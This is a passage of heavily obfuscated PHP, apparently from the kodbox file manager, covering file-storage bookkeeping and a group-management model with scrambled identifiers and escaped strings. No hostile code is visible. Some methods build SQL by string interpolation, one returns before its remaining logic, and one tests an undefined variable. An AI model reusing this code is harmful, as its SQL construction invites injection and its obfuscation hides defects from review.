$©¿Ç„ç»[$èá’Ïí[79]] = intval(substr($©¿Ç„ç»[$èá’Ïí[691]], 32)); } $åêÜ¡ü‡ = $this->add($©¿Ç„ç»); return $this->find($åêÜ¡ü‡); } public function addFile($ÏŞ…˜á, $Ïòó–¤, $ÉìÏ†éı, $ÅÌçÚ¾› = false) { $ËŞ¡¸èØ =& $_SERVER[öæÛ¿©¿]; $šâèË½Ú = IO::hashSimple($ÏŞ…˜á); $ê”û™â = IO::size($ÏŞ…˜á); $¶ÏÄŸ„· = $ê”û™â <= 1024 * 1024 * 10 ? IO::hashMd5($ÏŞ…˜á) : $ËŞ¡¸èØ[12]; $ØáßØ„ã = $ËŞ¡¸èØ[2194] . $šâèË½Ú; CacheLock::lock($ØáßØ„ã); if ($¶ÏÄŸ„· && $šâèË½Ú) { $Õóù¡í¦ = $this->addFileCheckExist($šâèË½Ú, $¶ÏÄŸ„·, $ê”û™â); if ($Õóù¡í¦) { CacheLock::unlock($ØáßØ„ã); return $Õóù¡í¦; } } $Ò‘èÏêÉ = $this->addFileMake($ÏŞ…˜á, $Ïòó–¤, $ê”û™â, $šâèË½Ú, $¶ÏÄŸ„·, $ÉìÏ†éı, $ÅÌçÚ¾›); $ãÄà‹¢ = $this->addFileData($Ò‘èÏêÉ); if (!$ãÄà‹¢) { return !1; } CacheLock::unlock($ØáßØ„ã); if (!$¶ÏÄŸ„· && $ãÄà‹¢) { $this->fileMd5Check($ãÄà‹¢); } return $ãÄà‹¢; } public function fileMd5Check($ß—±Ê²¤) { $İ²˜½Ùù =& $_SERVER[öæÛ¿©¿]; $¼Øä©ã = array($ß—±Ê²¤[$İ²˜½Ùù[553]], $ß—±Ê²¤[$İ²˜½Ùù[87]]); $ßšá¢˜ = $İ²˜½Ùù[2195] . $ß—±Ê²¤[$İ²˜½Ùù[87]]; $«Ìñ°å = $İ²˜½Ùù[2196] . $ß—±Ê²¤[$İ²˜½Ùù[553]]; TaskQueue::add($İ²˜½Ùù[2197], $¼Øä©ã, $ßšá¢˜, $«Ìñ°å); } public function fileMd5Set($Æñ¿Š¦’, $ÄôÛÉè²) { $ÁŠÒ´´¸ =& $_SERVER[öæÛ¿©¿]; $ÔÃ˜ÇÏ = $this->find($Æñ¿Š¦’); if (!$ÔÃ˜ÇÏ || $ÔÃ˜ÇÏ[$ÁŠÒ´´¸[559]]) { return; } $—ÜŠíŞ™ = IO::hashMd5($ÄôÛÉè²); if (!$—ÜŠíŞ™) { return $ÁŠÒ´´¸[12]; } $this->where(array($ÁŠÒ´´¸[553] => $Æñ¿Š¦’))->save(array($ÁŠÒ´´¸[559] => $—ÜŠíŞ™)); } public function addFileMake($±—‹·ôã, $ì÷Ì›¨®, $³„¹–ËÓ, $–¢èŞ˜Æ, $àó˜ñ™, $’¤íŒö¿, $¹€Š€øÏ) { $™Á¡£ŸŸ =& $_SERVER[öæÛ¿©¿]; $úĞıĞÏ  = $this->createFileName($’¤íŒö¿, $ì÷Ì›¨®, $–¢èŞ˜Æ, $àó˜ñ™); $Úú€‹˜ = get_path_father($úĞıĞÏ ); $‹Ã¥òí = get_path_this($úĞıĞÏ ); if ($¹€Š€øÏ) { $´ë°Ñ—ˆ = IO::move($±—‹·ôã, $Úú€‹˜, !1, $‹Ã¥òí); } else { $´ë°Ñ—ˆ = IO::copy($±—‹·ôã, $Úú€‹˜, !1, $‹Ã¥òí); } if (!$´ë°Ñ—ˆ) { return !1; } $²ˆŸª® = IO::init($´ë°Ñ—ˆ); $²ˆŸª®->cacheMethod($™Á¡£ŸŸ[180], $²ˆŸª®->path, $™Á¡£ŸŸ[177]); if (IO::size($´ë°Ñ—ˆ) != $³„¹–ËÓ) { return !1; } $È–ÊÁÛ¸ = array($™Á¡£ŸŸ[636] => $³„¹–ËÓ, $™Á¡£ŸŸ[2191] => 1, $™Á¡£ŸŸ[505] => $’¤íŒö¿, $™Á¡£ŸŸ[908] => $ì÷Ì›¨®[$™Á¡£ŸŸ[483]], $™Á¡£ŸŸ[506] => $úĞıĞÏ , $™Á¡£ŸŸ[2192] => $–¢èŞ˜Æ, $™Á¡£ŸŸ[2193] => $àó˜ñ™); return $È–ÊÁÛ¸; } public function addFileCheckExist($¼…ü‡âÈ, $Ü›ïöÚÄ, $õùİ¯õË) { $ÉÚ‘ÕÑ‹ =& $_SERVER[öæÛ¿©¿]; $üÊÎ²ŸË = $this->findByHash($¼…ü‡âÈ, $Ü›ïöÚÄ); if (!$üÊÎ²ŸË) { return !1; } $§©øì±³ = array($ÉÚ‘ÕÑ‹[2191] => intval($üÊÎ²ŸË[$ÉÚ‘ÕÑ‹[2198]]) + 1, $ÉÚ‘ÕÑ‹[636] => $õùİ¯õË); $this->where(array($ÉÚ‘ÕÑ‹[554] => $üÊÎ²ŸË[$ÉÚ‘ÕÑ‹[553]]))->save($§©øì±³); return $üÊÎ²ŸË; } public function remove($¸şöñª) { $this->linkCountChange($¸şöñª, !1); $this->clearEmpty(); return !0; } public function linkAdd($ÀÙä‡Ï«) { $this->linkCountChange($ÀÙä‡Ï«, !0); } public function linkCountChange($Ğ÷ËÆé, $¼ßˆö´ü) { $Ÿ†éÂ©Œ =& $_SERVER[öæÛ¿©¿]; if (!$Ğ÷ËÆé) { return; } if (!is_array($Ğ÷ËÆé)) { $Ğ÷ËÆé = array($Ğ÷ËÆé); } $¨ãşéÃ› = array(); foreach ($Ğ÷ËÆé as $®Õâ–Æ) { $‹¬Ôµ¦ë = $®Õâ–Æ . $Ÿ†éÂ©Œ[12]; if (!$¨ãşéÃ›[$‹¬Ôµ¦ë]) { $¨ãşéÃ›[$‹¬Ôµ¦ë] = 0; } $¨ãşéÃ›[$‹¬Ôµ¦ë]++; } $ôé€ô¥ = array(); foreach ($¨ãşéÃ› as $®Õâ–Æ => $Ş•²ËüÉ) { $‹¬Ôµ¦ë = $Ş•²ËüÉ . $Ÿ†éÂ©Œ[12]; if (!$ôé€ô¥[$‹¬Ôµ¦ë]) { $ôé€ô¥[$‹¬Ôµ¦ë] = array(); } $ôé€ô¥[$‹¬Ôµ¦ë][] = $®Õâ–Æ; } foreach ($ôé€ô¥ as $Ş•²ËüÉ => $Õàõáñ¹) { if (!$Õàõáñ¹) { continue; } $Ş•²ËüÉ = $¼ßˆö´ü ? $Ş•²ËüÉ : -intval($Ş•²ËüÉ); $ŠÂããç‚ = array($Ÿ†éÂ©Œ[553] => array($Ÿ†éÂ©Œ[7], $Õàõáñ¹)); if ($Ş•²ËüÉ < 0) { $ŠÂããç‚[$Ÿ†éÂ©Œ[2198]] = array($Ÿ†éÂ©Œ[1127], abs($Ş•²ËüÉ)); } $this->where($ŠÂããç‚)->setAdd($Ÿ†éÂ©Œ[2198], $Ş•²ËüÉ); } } public function findByHash($®ÒØ½æœ, $ÈÎ÷ÄÉ™ = false) { $äéÖ¬° =& $_SERVER[öæÛ¿©¿]; if (!$®ÒØ½æœ && !$ÈÎ÷ÄÉ™) { return !1; } $—Ã¤‚ÜŒ = array($äéÖ¬°[2192] => $®ÒØ½æœ); if ($ÈÎ÷ÄÉ™) { $—Ã¤‚ÜŒ = array($äéÖ¬°[2193] => $ÈÎ÷ÄÉ™); } return $this->order($äéÖ¬°[2199])->where($—Ã¤‚ÜŒ)->find(); } public function clearEmpty($¼½„½Öû = 1) { $Ù‹»‰¬ =& $_SERVER[öæÛ¿©¿]; $®»±À = time() - 3600 * 24 * $¼½„½Öû; $İÜª¸ = $Ù‹»‰¬[2200] . $®»±À; $ÎÕøÖ¥ = $this->where($İÜª¸)->select(); if (!$ÎÕøÖ¥) { return; } $£ïˆÎ‡ó = new Task($Ù‹»‰¬[2201], $Ù‹»‰¬[12], count($ÎÕøÖ¥)); foreach ($ÎÕøÖ¥ as $êìúó¹ô) { $£ïˆÎ‡ó->update(1); $this->resetFile($êìúó¹ô); } $£ïˆÎ‡ó->end(); } public function resetFile($ÑÈ«ü—ß) { $íÇ•ø•‚ =& $_SERVER[öæÛ¿©¿]; $Ë¤áƒ‡ğ = array($íÇ•ø•‚[554] => $ÑÈ«ü—ß[$íÇ•ø•‚[553]]); $Ş³Ãëş± = Model($íÇ•ø•‚[1478])->where($Ë¤áƒ‡ğ)->count(); $£±©ˆ™ = Model($íÇ•ø•‚[2202])->where($Ë¤áƒ‡ğ)->count(); $™Ñ¾Üé± = intval($Ş³Ãëş±) + intval($£±©ˆ™); if ($™Ñ¾Üé± == 0) { Model($íÇ•ø•‚[2203])->delete($ÑÈ«ü—ß[$íÇ•ø•‚[553]]); $this->where($Ë¤áƒ‡ğ)->delete(); $this->metaSet($ÑÈ«ü—ß[$íÇ•ø•‚[553]], null, null); if (!IO::isFile($ÑÈ«ü—ß[$íÇ•ø•‚[87]])) { write_log(array($íÇ•ø•‚[2204], ACTION, $ÑÈ«ü—ß), $íÇ•ø•‚[1313]); return !1; } IO::remove($ÑÈ«ü—ß[$íÇ•ø•‚[87]]); write_log(ACTION . $íÇ•ø•‚[933] . KodUser::id() . $íÇ•ø•‚[2205] . $ÑÈ«ü—ß[$íÇ•ø•‚[553]] . $íÇ•ø•‚[1994] . $ÑÈ«ü—ß[$íÇ•ø•‚[79]] . $íÇ•ø•‚[200] . $ÑÈ«ü—ß[$íÇ•ø•‚[87]], $íÇ•ø•‚[2204]); return; } if ($ÑÈ«ü—ß[$íÇ•ø•‚[2198]] != $™Ñ¾Üé±) { $this->where($Ë¤áƒ‡ğ)->save(array($íÇ•ø•‚[2191] => $™Ñ¾Üé±)); } } public function storageInfo($®ÊÜË—© = false) { $øö‘¾¨  =& $_SERVER[öæÛ¿©¿]; $ÀâÃœ·Œ = $this->count() + 0.0; $ĞÂÓªÓÒ = 0; $öºÓª…º = 1; $—î¾–€Ô = 0; $²‡¥ÄÕœ = 5000; for ($ÑŞàåĞÆ = 0; $ÑŞàåĞÆ < $ÀâÃœ·Œ; $ÑŞàåĞÆ = $ÑŞàåĞÆ + $²‡¥ÄÕœ) { $§øıÕ™ = $this->limit($ÑŞàåĞÆ, $ÑŞàåĞÆ + $²‡¥ÄÕœ)->select(); foreach ($§øıÕ™ as $ƒƒ¿È»²) { $öºÓª…º += $ƒƒ¿È»²[$øö‘¾¨ [79]] * $ƒƒ¿È»²[$øö‘¾¨ [2198]]; $ĞÂÓªÓÒ += $ƒƒ¿È»²[$øö‘¾¨ [79]] * ($ƒƒ¿È»²[$øö‘¾¨ [2198]] - 1); $—î¾–€Ô += $ƒƒ¿È»²[$øö‘¾¨ [2198]]; } } $Ò§À¨üÈ = array($øö‘¾¨ [2206] => $öºÓª…º, $øö‘¾¨ [2207] => $ĞÂÓªÓÒ, $øö‘¾¨ [2208] => $ĞÂÓªÓÒ / $öºÓª…º, $øö‘¾¨ [83] => $ÀâÃœ·Œ, $øö‘¾¨ [2209] => $—î¾–€Ô); return $Ò§À¨üÈ; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\165\160"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\141\155\x65" => "\x67\162\x6f\x75\160\x5f\155\145\164\141", "\x6d\x65\x74\141\106\x69\x65\154\x64" => "\147\162\x6f\165\160\x49\x44"); protected function cacheFunctionAlias($Õª›ë‹Ï) { $æÓüÓÏÈ =& $_SERVER[öæÛ¿©¿]; return array($æÓüÓÏÈ[2210] => array($Õª›ë‹Ï[0], $æÓüÓÏÈ[2211]), $æÓüÓÏÈ[2212] => array($Õª›ë‹Ï[0], $æÓüÓÏÈ[2213])); } protected function ___getInfo($¬™×²Ú) { $ûŸ‹çÂ = $this->getInfoSimple($¬™×²Ú); if (!$ûŸ‹çÂ) { return !1; } return $this->_listDataApplyItem($ûŸ‹çÂ); } protected function ___getInfoSimple($Í­Ü°ïã) { $ÑÂÔ´©ë = array($_SERVER[öæÛ¿©¿][1440] => intval($Í­Ü°ïã)); $–‡ßÒ³¨ = $this->where($ÑÂÔ´©ë)->find(); return is_array($–‡ßÒ³¨) ? $–‡ßÒ³¨ : array(); } protected function groupAdd($óùß œŒ) { $Øç±¬ĞÁ =& $_SERVER[öæÛ¿©¿]; if (!$óùß œŒ[$Øç±¬ĞÁ[191]] && isset($óùß œŒ[$Øç±¬ĞÁ[1440]]) && $óùß œŒ[$Øç±¬ĞÁ[1440]] == 1) { if ($Å¨Ï€€ = $this->getInfoSimple($óùß œŒ[$Øç±¬ĞÁ[1440]], !0)) { return $óùß œŒ[$Øç±¬ĞÁ[1440]]; } } else { $Å¨Ï€€ = $this->getInfoSimple($óùß œŒ[$Øç±¬ĞÁ[191]]); if (!$Å¨Ï€€) { return !1; } } $İâ¸³Œî = $Øç±¬ĞÁ[609]; if ($Å¨Ï€€[$Øç±¬ĞÁ[600]]) { $İâ¸³Œî = $Å¨Ï€€[$Øç±¬ĞÁ[600]] . $Å¨Ï€€[$Øç±¬ĞÁ[1440]] . $Øç±¬ĞÁ[50]; } $õÇš½´¥ = array($Øç±¬ĞÁ[505] => $this->groupNameAuto($óùß œŒ[$Øç±¬ĞÁ[191]], $óùß œŒ[$Øç±¬ĞÁ[32]]), $Øç±¬ĞÁ[488] => $óùß œŒ[$Øç±¬ĞÁ[191]], $Øç±¬ĞÁ[671] => $İâ¸³Œî, $Øç±¬ĞÁ[2214] => $óùß œŒ[$Øç±¬ĞÁ[2118]], $Øç±¬ĞÁ[2215] => 0, $Øç±¬ĞÁ[2135] => 0); $óùß œŒ[$Øç±¬ĞÁ[32]] = $õÇš½´¥[$Øç±¬ĞÁ[32]]; if (isset($óùß œŒ[$Øç±¬ĞÁ[2153]])) { $õÇš½´¥[$Øç±¬ĞÁ[2153]] = $óùß œŒ[$Øç±¬ĞÁ[2153]]; } else { $ÏÁİî„Ò = $this->max($Øç±¬ĞÁ[2153]); if (!$ÏÁİî„Ò) { $ÏÁİî„Ò = 0; } $õÇš½´¥[$Øç±¬ĞÁ[2153]] = $ÏÁİî„Ò + 1; } if (!empty($óùß œŒ[$Øç±¬ĞÁ[1440]])) { $õÇš½´¥[$Øç±¬ĞÁ[1440]] = $óùß œŒ[$Øç±¬ĞÁ[1440]]; } $Ù‘Ô†êø = $this->add($õÇš½´¥); $this->groupMetaEdit($Ù‘Ô†êø, $óùß œŒ); Model($Øç±¬ĞÁ[1478])->groupRootAdd($Ù‘Ô†êø); $this->_clearCache($óùß œŒ[$Øç±¬ĞÁ[191]]); return $Ù‘Ô†êø; } protected function groupEdit($ìœØ§â¬, $‚äãîÚÆ) { $ ‰Ü½–õ =& $_SERVER[öæÛ¿©¿]; $ğ‘áìªÉ = $this->getInfoSimple($ìœØ§â¬); if (!$ğ‘áìªÉ) { return !1; } if (!empty($‚äãîÚÆ[$ ‰Ü½–õ[191]])) { $³‰»°Š = $this->getInfoSimple($‚äãîÚÆ[$ ‰Ü½–õ[191]]); if (!$³‰»°Š) { return !1; } if ($ğ‘áìªÉ[$ ‰Ü½–õ[1440]] == $³‰»°Š[$ ‰Ü½–õ[1440]]) { return !1; } if ($‚äãîÚÆ[$ ‰Ü½–õ[191]] != $ğ‘áìªÉ[$ ‰Ü½–õ[191]]) { if ($³‰»°Š[$ ‰Ü½–õ[600]] !== $ğ‘áìªÉ[$ ‰Ü½–õ[600]] && strpos($³‰»°Š[$ ‰Ü½–õ[600]], $ğ‘áìªÉ[$ ‰Ü½–õ[600]] . $ğ‘áìªÉ[$ ‰Ü½–õ[1440]] . $ ‰Ü½–õ[50]) === 0) { return !1; } $‚äãîÚÆ[$ ‰Ü½–õ[671]] = $³‰»°Š[$ ‰Ü½–õ[600]] . $‚äãîÚÆ[$ ‰Ü½–õ[191]] . $ ‰Ü½–õ[50]; $this->_changeChildLevel($ğ‘áìªÉ, $³‰»°Š); $this->_clearCache($³‰»°Š[$ ‰Ü½–õ[1440]]); $this->_clearCache($ğ‘áìªÉ[$ ‰Ü½–õ[191]]); } } $this->groupMetaEdit($ìœØ§â¬, $‚äãîÚÆ); $this->_clearChildrenCache($ğ‘áìªÉ); return $this->where(array($ ‰Ü½–õ[2216] => $ìœØ§â¬))->save($‚äãîÚÆ); } private function groupMetaEdit($‰‚êÎµ, &$Œô½Šã) { $É¼£‹öÇ =& $_SERVER[öæÛ¿©¿]; if (isset($Œô½Šã[$É¼£‹öÇ[32]])) { $this->setNamePinyin($‰‚êÎµ, $Œô½Šã[$É¼£‹öÇ[32]]); } if (isset($Œô½Šã[$É¼£‹öÇ[2217]])) { $ş‘§Á‚  = array($É¼£‹öÇ[2217] => $Œô½Šã[$É¼£‹öÇ[2217]], $É¼£‹öÇ[2218] => $Œô½Šã[$É¼£‹öÇ[2218]]); unset($Œô½Šã[$É¼£‹öÇ[2217]]); unset($Œô½Šã[$É¼£‹öÇ[2218]]); if (isset($Œô½Šã[$É¼£‹öÇ[2219]])) { $øÀüœ½ô = $É¼£‹öÇ[1436] . $‰‚êÎµ; $ºÜ°˜Ì· = $É¼£‹öÇ[1435]; $¤ı–¯ = $Œô½Šã[$É¼£‹öÇ[2219]] ? $Œô½Šã[$É¼£‹öÇ[2219]] : $É¼£‹öÇ[12]; $Œæ÷ŸÎ = Model($É¼£‹öÇ[1434])->get($øÀüœ½ô, $ºÜ°˜Ì·); $Œæ÷ŸÎ = $Œæ÷ŸÎ ? $Œæ÷ŸÎ : $É¼£‹öÇ[12]; if ($Œæ÷ŸÎ != $¤ı–¯) { if (!$¤ı–¯ && $Œæ÷ŸÎ) { Model($É¼£‹öÇ[1434])->remove($øÀüœ½ô, $ºÜ°˜Ì·); } else { if ($¤ı–¯) { Model($É¼£‹öÇ[1434])->set($øÀüœ½ô, $¤ı–¯, $ºÜ°˜Ì·); } } } $ş‘§Á‚ [$É¼£‹öÇ[2219]] = $¤ı–¯; } $this->metaSet($‰‚êÎµ, $ş‘§Á‚ ); } } private function _clearChildrenCache($—ÀÆ¾÷Ö) { $éÌ¿ÊÓ =& $_SERVER[öæÛ¿©¿]; $ğ¥ÄÉ¬° = array($éÌ¿ÊÓ[671] => array($éÌ¿ÊÓ[631], $—ÀÆ¾÷Ö[$éÌ¿ÊÓ[600]] . $—ÀÆ¾÷Ö[$éÌ¿ÊÓ[1440]] . $éÌ¿ÊÓ[632])); $¤Óô­»É = $this->field($éÌ¿ÊÓ[1440])->where($ğ¥ÄÉ¬°)->select(); foreach ($¤Óô­»É as $•ÕÆÆÊÂ) { $this->_clearCache($•ÕÆÆÊÂ[$éÌ¿ÊÓ[1440]]); } } private function _clearCache($ìŞ‡†ªÃ) { $®ÆÉœÛ’ =& $_SERVER[öæÛ¿©¿]; $this->cacheFunctionClear($®ÆÉœÛ’[2220], $ìŞ‡†ªÃ); $this->cacheFunctionClear($®ÆÉœÛ’[2221], $ìŞ‡†ªÃ); } private function _changeChildLevel($¸ñ¬ÙÛà, $Í™ŸîŸÙ, $±Ş’×µà = false) { $¾ÕšÒØ =& $_SERVER[öæÛ¿©¿]; $ÔùåÌ¤ = $¸ñ¬ÙÛà[$¾ÕšÒØ[600]] . $¸ñ¬ÙÛà[$¾ÕšÒØ[1440]] . $¾ÕšÒØ[50]; $šü‡Ğ¸ = $Í™ŸîŸÙ[$¾ÕšÒØ[600]] . $Í™ŸîŸÙ[$¾ÕšÒØ[1440]] . $¾ÕšÒØ[50] . $¸ñ¬ÙÛà[$¾ÕšÒØ[1440]] . $¾ÕšÒØ[50]; if ($±Ş’×µà) { $šü‡Ğ¸ = $Í™ŸîŸÙ[$¾ÕšÒØ[600]] . $Í™ŸîŸÙ[$¾ÕšÒØ[1440]] . $¾ÕšÒØ[50]; } $â„¯Ù“— = array($¾ÕšÒØ[671] => array($¾ÕšÒØ[631], $¸ñ¬ÙÛà[$¾ÕšÒØ[600]] . $¸ñ¬ÙÛà[$¾ÕšÒØ[1440]] . $¾ÕšÒØ[632])); $àéùŞÌÜ = array($¾ÕšÒØ[671] => array($¾ÕšÒØ[680], "\162\145\160\x6c\x61\x63\145\50\x70\x61\x72\x65\x6e\164\114\145\x76\x65\x6c\x2c\x27{$ÔùåÌ¤}\47\x2c\x27{$šü‡Ğ¸}\47\51")); $this->_clearChildrenCache($¸ñ¬ÙÛà); $this->where($â„¯Ù“—)->data($àéùŞÌÜ)->save(); } public function setNamePinyin($ê²Ü½Ëœ, $ù¸÷ÓæÈ = false) { $£¤ş»™¼ =& $_SERVER[öæÛ¿©¿]; if (!$ù¸÷ÓæÈ) { $Ù—¿Ê“Í = $this->getInfoSimple($ê²Ü½Ëœ); $ù¸÷ÓæÈ = $Ù—¿Ê“Í[$£¤ş»™¼[32]]; } if (!Input::check($ù¸÷ÓæÈ, $£¤ş»™¼[674])) { $this->metaSet($ê²Ü½Ëœ, $£¤ş»™¼[548], null); $this->metaSet($ê²Ü½Ëœ, $£¤ş»™¼[547], null); return; } $åå¢¹  = array($£¤ş»™¼[548] => str_replace($£¤ş»™¼[53], $£¤ş»™¼[12], Pinyin::get($ù¸÷ÓæÈ)), $£¤ş»™¼[547] => Pinyin::get($ù¸÷ÓæÈ, $£¤ş»™¼[675])); $this->metaSet($ê²Ü½Ëœ, $åå¢¹ ); } protected function metaSet($òí¿Ùıç, $Ûªö•• = null, $ë”µîñÖ = null) { $this->_clearCache($òí¿Ùıç); return parent::metaSet($òí¿Ùıç, $Ûªö••, $ë”µîñÖ); } protected function groupStatus($Ïé÷Îß, $Òµ¨¥ª’) { $”¬ôÃ‘¼ =& $_SERVER[öæÛ¿©¿]; $È–×àÙë = $this->getInfoSimple($Ïé÷Îß); if (!$È–×àÙë) { return !1; } $this->_clearCache($Ïé÷Îß); return $this->metaSet($Ïé÷Îß, $”¬ôÃ‘¼[842], $Òµ¨¥ª’); if ($Òµ¨¥ª’ == $”¬ôÃ‘¼[91]) { $ä‘Í—òá = $this->parentLevelArray($È–×àÙë[$”¬ôÃ‘¼[600]]); } else { } $ä‘Í—òá[] = $È–×àÙë[$”¬ôÃ‘¼[1440]]; $—Ù–Ü÷« = array(); foreach ($ä‘Í—òá as $Ïé÷Îß) { $—Ù–Ü÷«[] = array($”¬ôÃ‘¼[1440] => $Ïé÷Îß, $”¬ôÃ‘¼[95] => $”¬ôÃ‘¼[842], $”¬ôÃ‘¼[451] => $Òµ¨¥ª’); $this->_clearCache($Ïé÷Îß); } return Model($”¬ôÃ‘¼[2222])->addAll($—Ù–Ü÷«, array(), !0); } protected function groupRemove($Ñ¸’Ü˜ø, $øŠ¸ş½ = false) { $¾Â ˆ¢µ =& $_SERVER[öæÛ¿©¿]; $Àğñ±ï± = array($¾Â ˆ¢µ[1440] => $Ñ¸’Ü˜ø); $²õƒ§Ãê = $this->where($Àğñ±ï±)->find(); if (!$²õƒ§Ãê || $²õƒ§Ãê[$¾Â ˆ¢µ[191]] == 0) { return !1; } if (!$øŠ¸ş½) { $Á¡Çğ  = $this->getInfoSimple($²õƒ§Ãê[$¾Â ˆ¢µ[191]]); $this->_changeChildLevel($²õƒ§Ãê, $Á¡Çğ , !0); $this->where(array($¾Â ˆ¢µ[191] => $Ñ¸’Ü˜ø))->save(array($¾Â ˆ¢µ[191] => $²õƒ§Ãê[$¾Â ˆ¢µ[191]])); $this->_clearCache($Á¡Çğ [$¾Â ˆ¢µ[1440]]); } Model($¾Â ˆ¢µ[2222])->where($Àğñ±ï±)->delete(); Model($¾Â ˆ¢µ[2223])->where($Àğñ±ï±)->delete(); Model($¾Â ˆ¢µ[925])->groupRootRemove($Ñ¸’Ü˜ø); $this->_clearCache($²õƒ§Ãê[$¾Â ˆ¢µ[191]]); return $this->where($Àğñ±ï±)->delete(); } protected function groupSort($£Ÿ­øğ) { $â…Õ¼òß =& $_SERVER[öæÛ¿©¿]; $ÎĞ¸“÷• = array(); foreach ($£Ÿ­øğ as $Ù¯åÂëä => $ğüËÁİà) { $ÎĞ¸“÷•[] = array($â…Õ¼òß[1440], $ğüËÁİà, $â…Õ¼òß[2153], $Ù¯åÂëä + 1); } $this->saveAll($ÎĞ¸“÷•); } public function listData() { $ÜÁ™öÁğ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÜÁ™öÁğ[$_SERVER[öæÛ¿©¿][446]]); return $ÜÁ™öÁğ; } private function _makeOrder($®ü½¦‘Ğ = '') { $Ì“¨ËÙø =& $_SERVER[öæÛ¿©¿]; $û³×òÕ… = array($Ì“¨ËÙø[1440], $Ì“¨ËÙø[32], $Ì“¨ËÙø[2120], $Ì“¨ËÙø[232]); $ÀŠ––×ô = array($Ì“¨ËÙø[533] => $Ì“¨ËÙø[534], $Ì“¨ËÙø[535] => $Ì“¨ËÙø[536]); $™ÛòÀûŸ = Input::get($Ì“¨ËÙø[540], $Ì“¨ËÙø[7], $Ì“¨ËÙø[2135], $û³×òÕ…); $ÆÌ•† = Input::get($Ì“¨ËÙø[541], $Ì“¨ËÙø[7], $Ì“¨ËÙø[2224], array($Ì“¨ËÙø[2224], $Ì“¨ËÙø[535])); $ÆÌ•† = $ÀŠ––×ô[$ÆÌ•†]; $®ü½¦‘Ğ = $®ü½¦‘Ğ . "{$™ÛòÀûŸ}\40{$ÆÌ•†}\54\40\147\162\x6f\165\x70\111\x44\40\x61\163\143"; return $this->order($®ü½¦‘Ğ); } public function listChild($™ËµÆ­) { $‹ãšÄ´ó =& $_SERVER[öæÛ¿©¿]; $Ş¤©Ùì÷ = $this->where(array($‹ãšÄ´ó[191] => $™ËµÆ­))->_makeOrder()->selectPage(200); $this->_listDataApply($Ş¤©Ùì÷[$‹ãšÄ´ó[446]]); return $Ş¤©Ùì÷; } public function listChildIds($×³šûÍö) { $ù„Ö¡Óã =& $_SERVER[öæÛ¿©¿]; if (is_string($–şĞÏºé)) { $×³šûÍö = explode($ù„Ö¡Óã[50], $×³šûÍö); } $Íú¸¶é = $this->where(array($ù„Ö¡Óã[1440] => array($ù„Ö¡Óã[7], $×³šûÍö)))->field($ù„Ö¡Óã[2225])->select(); if (!$Íú¸¶é) { return !1; } $Ò¯Î¯´Ò = array(); foreach ($Íú¸¶é as $ú–Äö³) { $Ò¯Î¯´Ò[] = "\x73\x65\x6c\145\143\164\x20\147\162\x6f\165\x70\111\104\x20\x66\162\x6f\155\x20\x60\147\162\157\x75\x70\140\x20\x77\x68\145\162\145\x20\x70\141\162\145\x6e\x74\114\145\x76\145\x6c\40\x6c\x69\153\x65\40\x27{$ú–Äö³[$ù„Ö¡Óã[600]]}{$ú–Äö³[$ù„Ö¡Óã[1440]]}\x2c\x25\x27"; } $Ò¯Î¯´Ò = implode($ù„Ö¡Óã[2226], $Ò¯Î¯´Ò); $Íú¸¶é = $this->query($Ò¯Î¯´Ò); if (!$Íú¸¶é) { return array(); } $×³šûÍö = array_to_keyvalue($Íú¸¶é, $ù„Ö¡Óã[12], $ù„Ö¡Óã[1440]); return array_unique($×³šûÍö); } public function listByID($ûÇŒíûÕ) { $´½Î‹æá =& $_SERVER[öæÛ¿©¿]; if (!$ûÇŒíûÕ) { return array(); } $½»¼š÷¹ = array($´½Î‹æá[1440] => array($´½Î‹æá[7], $ûÇŒíûÕ)); $ÆØ£ÈÂ = $this->where($½»¼š÷¹)->select(); $ÆØ£ÈÂ = array_sort_keep($ÆØ£ÈÂ, $´½Î‹æá[1440], $ûÇŒíûÕ); $this->_listDataApply($ÆØ£ÈÂ); return $ÆØ£ÈÂ; } public function listSearch($ßŒ°ü¼Ö) { $‰Ñ…€©• =& $_SERVER[öæÛ¿©¿]; $î©â¸—ı = trim($ßŒ°ü¼Ö[$‰Ñ…€©•[2227]]); $¦ø¢‡ÓË = explode($‰Ñ…€©•[53], $î©â¸—ı); if (!$î©â¸—ı || count($¦ø¢‡ÓË) == 1) { return $this->listSearchNow($ßŒ°ü¼Ö); } $ÆÑ™÷î‡ = array($‰Ñ…€©•[446] => array()); foreach ($¦ø¢‡ÓË as $ä¦”“¯§) { if (!trim($ä¦”“¯§)) { continue; } $ßŒ°ü¼Ö[$‰Ñ…€©•[2227]] = $ä¦”“¯§; $ÏêÆİƒ = $this->listSearchNow($ßŒ°ü¼Ö); $ÆÑ™÷î‡[$‰Ñ…€©•[446]] = array_merge($ÆÑ™÷î‡[$‰Ñ…€©•[446]], $ÏêÆİƒ[$‰Ñ…€©•[446]]); } $ÆÑ™÷î‡[$‰Ñ…€©•[446]] = array_unique_by_key($ÆÑ™÷î‡[$‰Ñ…€©•[446]], $‰Ñ…€©•[1440]); $ÆÑ™÷î‡[$‰Ñ…€©•[443]] = array($‰Ñ…€©•[444] => count($ÆÑ™÷î‡[$‰Ñ…€©•[446]]), $‰Ñ…€©•[440] => 20, $‰Ñ…€©•[429] => 1, $‰Ñ…€©•[445] => 1); return $ÆÑ™÷î‡; } public function listSearchNow($¨¼¤©Ùó) { $ƒ²‚ë’£ =& $_SERVER[öæÛ¿©¿]; $Í¹ï’Èõ = trim($¨¼¤©Ùó[$ƒ²‚ë’£[2227]]); $óÜ¤É• = isset($¨¼¤©Ùó[$ƒ²‚ë’£[2228]]) ? $¨¼¤©Ùó[$ƒ²‚ë’£[2228]] : !1; if (!trim($Í¹ï’Èõ)) { return !1; } $Í¹ï’Èõ = str_replace($ƒ²‚ë’£[2229], $ƒ²‚ë’£[2230], $Í¹ï’Èõ); $áÅåç¯© = array($ƒ²‚ë’£[1440] => array($ƒ²‚ë’£[470], "{$Í¹ï’Èõ}\45"), $ƒ²‚ë’£[32] => array($ƒ²‚ë’£[470], "\x25{$Í¹ï’Èõ}\x25"), $ƒ²‚ë’£[1112] => $ƒ²‚ë’£[2231]); if ($óÜ¤É•) { $»ØƒòÙ® = $this->getInfoSimple($óÜ¤É•); $ùô…şÇÜ = $»ØƒòÙ®[$ƒ²‚ë’£[600]] . $óÜ¤É• . $ƒ²‚ë’£[632]; $áÅåç¯© = array($áÅåç¯©, array($ƒ²‚ë’£[600] => array($ƒ²‚ë’£[470], $ùô…şÇÜ))); } $áÅåç¯© 